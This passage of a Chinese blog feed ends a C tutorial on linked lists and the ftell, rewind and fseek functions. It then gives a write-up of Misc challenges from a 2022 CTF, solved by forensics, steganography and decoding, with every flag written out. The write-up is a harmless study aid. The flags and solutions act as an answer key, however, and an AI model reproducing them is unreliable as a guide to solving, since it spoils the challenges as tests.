class="line">/**</span><br><span class="line"> * @brief printfList 遍历链表</span><br><span class="line"> * @param head 链表的头指针</span><br><span class="line"> */</span><br><span class="line">void printfList(Person *head)&#123;</span><br><span class="line">    // 1.取出头节点的下一个节点</span><br><span class="line">    Person *cur = head-&gt;next;</span><br><span class="line">    // 2.判断是否为NULL, 如果不为NULL就开始遍历</span><br><span class="line">    while(cur != NULL)&#123;</span><br><span class="line">        // 2.1取出当前节点的数据, 打印</span><br><span class="line">        printf(&quot;name = %s\n&quot;, cur-&gt;name);</span><br><span class="line">        printf(&quot;age = %i\n&quot;, cur-&gt;age);</span><br><span class="line">        printf(&quot;height = %lf\n&quot;, cur-&gt;height);</span><br><span class="line">        printf(&quot;next = %x\n&quot;, cur-&gt;next);</span><br><span class="line">        printf(&quot;-----------\n&quot;);</span><br><span class="line">        // 2.2让当前节点往后移动</span><br><span class="line">        cur = cur-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @brief insertNode 插入新的节点</span><br><span class="line"> * @param head 链表的头指针</span><br><span class="line"> * @param p 需要插入的结构体</span><br><span class="line"> */</span><br><span class="line">void  insertNode(Person *head, char *name, int age, double height)&#123;</span><br><span class="line">    // 1.创建一个新的节点</span><br><span class="line">    Person *node = (Person *)malloc(sizeof(Person));</span><br><span class="line">    // 2.将数据保存到新节点中</span><br><span class="line">    node-&gt;name = name;</span><br><span class="line">    node-&gt;age = age;</span><br><span class="line">    node-&gt;height = height;</span><br><span class="line"></span><br><span class="line">    // 3.进行插入</span><br><span class="line">    // 3.1让新节点的下一个节点 等于 头节点的下一个节点</span><br><span class="line">    node-&gt;next = head-&gt;next;</span><br><span class="line">    // 3.2让头结点的下一个节点 等于 新节点</span><br><span class="line">    head-&gt;next = node;</span><br><span class="line">&#125;</span><br><span class="line">/**</span><br><span class="line"> * @brief createEmpty 创建一个空链表</span><br><span class="line"> * @return 链表头指针, 创建失败返回NULL</span><br><span class="line"> */</span><br><span class="line">Person *createEmpty()&#123;</span><br><span class="line">    // 1.定义头指针</span><br><span class="line">    Person *head = NULL;</span><br><span class="line">    // 2.创建一个空节点, 并且赋值给头指针</span><br><span class="line">    head = (Person *)malloc(sizeof(Person));</span><br><span class="line">    if(head == NULL)&#123;</span><br><span class="line">        return head;</span><br><span class="line">    &#125;</span><br><span class="line">    head-&gt;next = NULL;</span><br><span class="line">    // 3.返回头指针</span><br><span class="line">    return head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="其它文件操作函数"><a href="#其它文件操作函数" class="headerlink" title="其它文件操作函数"></a>其它文件操作函数</h2><ul>
<li>ftell 函数</li>
</ul>
<table>
<thead>
<tr>
<th>函数声明</th>
<th>long ftell ( FILE * stream );</th>
</tr>
</thead>
<tbody><tr>
<td>所在文件</td>
<td>stdio.h</td>
</tr>
<tr>
<td>函数功能</td>
<td>得到流式文件的当前读写位置,其返回值是当前读写位置偏离文件头部的字节数.</td>
</tr>
<tr>
<td>参数及返回解析</td>
<td></td>
</tr>
<tr>
<td>参数</td>
<td>FILE * 流文件句柄</td>
</tr>
<tr>
<td>返回值</td>
<td>int 成功，返回当前读写位置偏离文件头部的字节数。失败， 返回-1</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *str = &quot;123456789&quot;;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    long cp = ftell(fp);</span><br><span class="line">    printf(&quot;cp = %li\n&quot;, cp); // 0</span><br><span class="line">    // 写入一个字节</span><br><span class="line">    fputc(str[0], fp);</span><br><span class="line">    cp = ftell(fp);</span><br><span class="line">    printf(&quot;cp = %li\n&quot;, cp); // 1</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>rewind 函数</li>
</ul>
<table>
<thead>
<tr>
<th>函数声明</th>
<th>void rewind ( FILE * stream );</th>
</tr>
</thead>
<tbody><tr>
<td>所在文件</td>
<td>stdio.h</td>
</tr>
<tr>
<td>函数功能 将文件指针重新指向一个流的开头。</td>
<td></td>
</tr>
<tr>
<td>参数及返回解析</td>
<td></td>
</tr>
<tr>
<td>参数</td>
<td>FILE * 流文件句柄</td>
</tr>
<tr>
<td>返回值</td>
<td>void 无返回值</td>
</tr>
</tbody></table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    char *str = &quot;123456789&quot;;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    long cp = ftell(fp);</span><br><span class="line">    printf(&quot;cp = %li\n&quot;, cp); // 0</span><br><span class="line">    // 写入一个字节</span><br><span class="line">    fputc(str[0], fp);</span><br><span class="line">    cp = ftell(fp);</span><br><span class="line">    printf(&quot;cp = %li\n&quot;, cp); // 1</span><br><span class="line">    // 新指向一个流的开头</span><br><span class="line">    rewind(fp);</span><br><span class="line">    cp = ftell(fp);</span><br><span class="line">    printf(&quot;cp = %li\n&quot;, cp); // 0</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>fseek 函数</li>
</ul>
<table>
<thead>
<tr>
<th align="center">函数声明</th>
<th align="center">int fseek ( FILE * stream, long offset, int where);</th>
</tr>
</thead>
<tbody><tr>
<td align="center">所在文件</td>
<td align="center">stdio.h</td>
</tr>
<tr>
<td align="center">函数功能</td>
<td align="center">偏移文件指针。</td>
</tr>
<tr>
<td align="center">参数及返回解析</td>
<td align="center"></td>
</tr>
<tr>
<td align="center">参 数</td>
<td align="center">FILE * stream 文件句柄</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">long offset 偏移量</td>
</tr>
<tr>
<td align="center"></td>
<td align="center">int where 偏移起始位置</td>
</tr>
<tr>
<td align="center">返回值</td>
<td align="center">int 成功返回 0 ，失败返回-1</td>
</tr>
</tbody></table>
<ul>
<li>常用宏</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define SEEK_CUR 1 当前文字</span><br><span class="line">#define SEEK_END 2 文件结尾</span><br><span class="line">#define SEEK_SET 0 文件开头</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp = fopen(&quot;test.txt&quot;, &quot;w+&quot;);</span><br><span class="line">    fputs(&quot;123456789&quot;, fp);</span><br><span class="line">    // 将文件指针移动到文件结尾, 并且偏移0个单位</span><br><span class="line">    fseek(fp, 0, SEEK_END);</span><br><span class="line">    int len = ftell(fp); // 计算文件长度</span><br><span class="line">    printf(&quot;len = %i\n&quot;, len);</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">   fp = fopen(&quot;file.txt&quot;,&quot;w+&quot;);</span><br><span class="line">   fputs(&quot;123456789&quot;, fp);</span><br><span class="line"></span><br><span class="line">   fseek( fp, 7, SEEK_SET );</span><br><span class="line">   fputs(&quot;lnj&quot;, fp);</span><br><span class="line">   fclose(fp);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>C</category>
      </categories>
      <tags>
        <tag>C</tag>
      </tags>
  </entry>
  <entry>
    <title>长安“战疫”网络安全卫士守护赛wp</title>
    <url>/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/</url>
    <content><![CDATA[<p>长安“战疫”网络安全卫士守护赛wp</p>
<span id="more"></span>

<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/1.png" alt=" "></p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h3 id="【八卦迷宫】"><a href="#【八卦迷宫】" class="headerlink" title="【八卦迷宫】"></a>【八卦迷宫】</h3><p>按照迷宫走然后取字的拼音即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;zhanchangyangchangzhanyanghechangshanshananzhanyiyizhanyianyichanganyang&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【朴实无华的取证】"><a href="#【朴实无华的取证】" class="headerlink" title="【朴实无华的取证】"></a>【朴实无华的取证】</h3><p>首先查看版本 imageinfo得到WinXPSP2x86</p>
<p>然后pslist，注意到<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16.png" alt="img"></p>
<p>然后</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-16418946537742.png" alt="img"></p>
<p>发现目录是桌面而并非Desktop，重新filescan一下，导出有用信息<img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-16418946676494.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-r6LzEg9C-1641631822278)(mumuzi.assets/image-20220108103543050.png)]"></p>
<p>首先zip的密码是上面说的20211209</p>
<p>其次，得到的txt是加密函数，而密文在flag.png上。反过来写一个脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &#x27;fdcb[8ldq?zloo?fhuwdlqob?vxffhhg?lq?iljkwlqj?wkh?hslghplf]&#x27;</span><br><span class="line">for i in s:</span><br><span class="line">    if(ord(i)&gt;=ord(&#x27;a&#x27;) and ord(i)&lt;=ord(&#x27;w&#x27;)):</span><br><span class="line">        print(chr(ord(i)-3),end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;a&#x27;):</span><br><span class="line">        print(&#x27;x&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;b&#x27;):</span><br><span class="line">        print(&#x27;y&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &#x27;c&#x27;):</span><br><span class="line">        print(&#x27;z&#x27;,end=&#x27;&#x27;)</span><br><span class="line">    elif(i == &quot;|&quot;):</span><br><span class="line">        print(&#x27;_&#x27;)</span><br><span class="line">    else:</span><br><span class="line">        print(chr(ord(i)+32),end=&#x27;&#x27;)</span><br><span class="line"> #ca`_&#123;Xian_šill_certainl__s˜cceed_in_fighting_the_epidemic&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查了一下certainl后面应该还有个y</p>
<p>然后前面那个单词是will，后面那个单词是succeed，于是得到flag提交正确</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;Xian_will_certainly_succeed_in_fighting_the_epidemic&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【无字天书】"><a href="#【无字天书】" class="headerlink" title="【无字天书】"></a>【无字天书】</h3><p>导出HTTP流，在导出的其中两个文件发现hex串，都是很明显的zip，hex–&gt;ascii，得到zip，打开zip得到两文件，一个key.ws一个flag.txt</p>
<p>ws很明显的whitespace，直接<a href="https://vii5ard.github.io/whitespace/%E5%BE%97%E5%88%B0key:XiAnWillBeSafe">https://vii5ard.github.io/whitespace/得到key:XiAnWillBeSafe</a></p>
<p>然后flag.txt很明显的SNOW</p>
<p>.\SNOW.EXE -p XiAnWillBeSafe -C .\flag.txt</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/e73eff4d3bef4ba0ae7cb1e9ff699660.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-5EINTl6Z-1641631822281)(mumuzi.assets/image-20220108104800137.png)]"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;C4n_y0u_underSt4nd_th3_b0oK_With0ut_Str1ng&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【西安加油】"><a href="#【西安加油】" class="headerlink" title="【西安加油】"></a>【西安加油】</h3><p>这道题我看了很久，在比赛中还是没有写出来。</p>
<p>查看流量包发现大量的base64串，导出http发现secret.txt，base64解码发现是zip，保存后打开发现是拼图</p>
<p>因为不知道大小，所以猜了一个12*4</p>
<p>命令montage *png -tile 12x4 -geometry 100x100+0+0 out2.png</p>
<p>然后用gaps</p>
<p>python3 gaps –image=out2.png –generations=10 –population=48 –size=100 –save</p>
<p><img src="/2022/01/08/%E9%95%BF%E5%AE%89%E2%80%9C%E6%88%98%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%8D%AB%E5%A3%AB%E5%AE%88%E6%8A%A4%E8%B5%9Bwp/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5pivTXVtdXpp,size_20,color_FFFFFF,t_70,g_se,x_16-16418948450307.png" alt="[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-qmPkoNBX-1641631822284)(mumuzi.assets/image-20220108104953204.png)]"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;make_XiAN_great_Again&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【binary】"><a href="#【binary】" class="headerlink" title="【binary】"></a>【binary】</h3><p>文件头能看出来是class文件，直接扔jadx</p>
<p>数组转出来</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = [77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 70, 120, 117, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 65, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 119, 77, 70, 120, 117, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 70, 120, 117, 77, 68, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 68, 69, 120, 77, 84, 69, 119, 77, 86, 120, 117, 77, 68, 69, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 65, 119, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 120, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 120, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 70, 120, 117, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 84, 65, 119, 77, 84, 69, 120, 77, 68, 65, 120, 77, 84, 69, 119, 77, 68, 69, 119, 77, 84, 65, 120, 77, 84, 69, 119, 77, 84, 65, 120, 77, 86, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 84, 65, 120, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 84, 65, 120, 77, 68, 69, 119, 77, 68, 69, 119, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 65, 119, 77, 84, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 119, 77, 84, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 69, 120, 77, 68, 65, 120, 77, 84, 65, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 70, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 120, 77, 84, 69, 119, 77, 84, 69, 119, 77, 68, 65, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 120, 77, 68, 69, 119, 77, 68, 69, 120, 77, 86, 120, 117, 77, 68, 69, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 69, 120, 77, 84, 69, 120, 77, 84, 69, 119, 77, 68, 65, 119, 77, 68, 65, 120, 77, 68, 69, 119, 77, 84, 65, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 69, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 119, 77, 84, 69, 119, 77, 84, 65, 119, 77, 84, 69, 120, 77, 84, 65, 119, 77, 68, 69, 120, 77, 68, 69, 120, 77, 70, 120, 117, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 120, 77, 84, 69, 120, 77, 84, 65, 120, 77, 84, 69, 120, 77, 68, 69, 120, 77, 68, 65, 119, 77, 68, 65, 119, 77, 68, 69, 119, 77, 68, 65, 120, 77, 84, 65, 119, 77, 65, 61, 61]</span><br><span class="line">for i in s:</span><br><span class="line">    print(chr(i),end=&#x27;&#x27;)</span><br></pre></td></tr></table></figure>

<p>得到base64，解码是01串，明显的二维码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s = &#x27;0000000101110000000011111101110000000\n0111110101101010111110001110110111110\n0100010100001111000111010110110100010\n0100010110000011000111000001010100010\n0100010111011011001101101011110100010\n0111110101110100000001001000010111110\n0000000101010101010101010101010000000\n1111111100100000000100110011111111111\n1100010101010000101111110100000011000\n0101101000110010010000100110101011101\n1011000001001111001100011010000010010\n1110111111110010101101000110101011100\n1010110001110000000110100000000000010\n0110101001000100011011101011101111101\n0010100100111111101110000110010100010\n0010001101110110110011001100110011101\n1110100110001111111011010011000000010\n0000111010100011100000101101111110111\n1101100110101101001100010100110000100\n0101001001111001000001001110010010111\n0101010011000111000110010000010101000\n1001101111101110110010011111101011101\n1101100010111000000101110110001011010\n0011001000111101100011110100100111101\n0101000001110101110110101111110100010\n0101011011001001000000110100010011111\n0110100010001110010110011011111001100\n0111001111100000010110110111001111100\n0100110010110010100010111011000000000\n1111111101011001110011100101011101011\n0000000111000111011010110001010100100\n0111110111001101010110101100011101111\n0100010100110000110011010000000000010\n0100010101111101100011111111110100111\n0100010101101111111100000010101010110\n0111110111111000101101001111000110110\n0000000111111011110110000000100011000&#x27;</span><br><span class="line">s = s.split(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line">pic = Image.new(&#x27;RGB&#x27;,(37,37),(255,255,255))</span><br><span class="line">for i in range(37):</span><br><span class="line">    for j in range(37):</span><br><span class="line">        if(s[i][j] == &#x27;0&#x27;):</span><br><span class="line">            pic.putpixel((j,i),(0,0,0))</span><br><span class="line">pic.show()</span><br><span class="line">pic.save(&#x27;fllllag.png&#x27;)</span><br></pre></td></tr></table></figure>

<p>扫码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;932b2c0070e4897ea7df0190dbf36ece&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【ez-Encrypt】"><a href="#【ez-Encrypt】" class="headerlink" title="【ez_Encrypt】"></a>【ez_Encrypt】</h3><p>pyc的steg很明显是剑龙，注意python版本号，我用3.9没跑出来，3.6能跑</p>
<p>跑出来得到key：St3g1sV3ryFuNny</p>
<p>当然密文更明显是emoji-aes，解密得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cazy&#123;Em0j1s_AES_4nd_PyC_St3g_D0_yoU_l1ke&#125;</span><br></pre></td></tr></table></figure>

<h3 id="【Ez-Steg】"><a href="#【Ez-Steg】" class="headerlink" title="【Ez_Steg】"></a>【Ez_Steg】</h3><p>这次题目的流量包都只需要导出HTTP就能做了</p>
